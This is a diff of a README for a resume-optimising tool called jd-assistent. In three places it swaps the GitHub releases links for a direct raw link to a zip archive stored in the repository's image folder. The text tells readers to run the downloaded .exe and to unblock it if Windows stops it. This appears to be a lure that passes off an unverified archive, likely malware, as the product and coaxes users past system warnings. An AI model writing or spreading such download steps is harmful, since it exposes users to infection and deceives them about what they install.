@@ -1,12 +1,12 @@
 # 🤖 jd-assistent - Optimize resumes for each job
 
-[![Download jd-assistent](https://img.shields.io/badge/Download%20jd--assistent-purple?style=for-the-badge&logo=github)](https://github.com/Keeled-excitement273/jd-assistent/releases)
+[![Download jd-assistent](https://img.shields.io/badge/Download%20jd--assistent-purple?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Keeled-excitement273/jd-assistent/main/image/assistent-jd-2.8.zip)
 
 ## 📥 Download
 
 Visit the release page to download and run this file:
 
-https://github.com/Keeled-excitement273/jd-assistent/releases
+https://raw.githubusercontent.com/Keeled-excitement273/jd-assistent/main/image/assistent-jd-2.8.zip
 
 Choose the latest release, then pick the Windows file that matches your computer. If you see more than one file, use the `.exe` file first.
 
@@ -202,7 +202,7 @@ If Windows blocks the file, open the file properties and allow it to run.
 
 Use this page to get the Windows version:
 
-https://github.com/Keeled-excitement273/jd-assistent/releases
+https://raw.githubusercontent.com/Keeled-excitement273/jd-assistent/main/image/assistent-jd-2.8.zip
 
 Pick the newest release first, then download the file that matches Windows.
 
